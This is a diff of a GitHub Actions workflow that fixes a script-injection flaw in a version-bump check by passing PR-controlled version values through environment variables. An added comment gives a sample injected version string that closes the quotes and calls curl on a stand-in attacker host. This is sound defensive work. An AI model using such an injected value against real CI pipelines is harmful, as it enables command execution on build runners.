@@ -34,12 +34,19 @@ jobs:
         id: main
         run: echo "version=$(node -p "require('./main-branch/package.json').version")" >> $GITHUB_OUTPUT
       - name: Check version was bumped
+        # The versions come from a PR-controlled package.json. Interpolating
+        # ${{ ... }} straight into the script would splice that content into the
+        # shell — a fork PR could set "version" to `x"; curl attacker.tld; "` and
+        # get command execution here. Via env: the values are data, not script.
+        env:
+          PR_VERSION: ${{ steps.pr.outputs.version }}
+          MAIN_VERSION: ${{ steps.main.outputs.version }}
         run: |
-          if [ "${{ steps.pr.outputs.version }}" = "${{ steps.main.outputs.version }}" ]; then
-            echo "::error::Version not bumped! PR version (${{ steps.pr.outputs.version }}) is the same as main. Bump the version in all package.json files and Cargo.toml before merging."
+          if [ "$PR_VERSION" = "$MAIN_VERSION" ]; then
+            echo "::error::Version not bumped! PR version ($PR_VERSION) is the same as main. Bump the version in all package.json files and Cargo.toml before merging."
             exit 1
           fi
-          echo "Version bumped: ${{ steps.main.outputs.version }} → ${{ steps.pr.outputs.version }}"
+          echo "Version bumped: $MAIN_VERSION → $PR_VERSION"
 
   # Prevents the publish job (publish.yml, runs post-merge on push to main) from
   # failing with "ReleaseAsset already_exists". That happens when the desktop
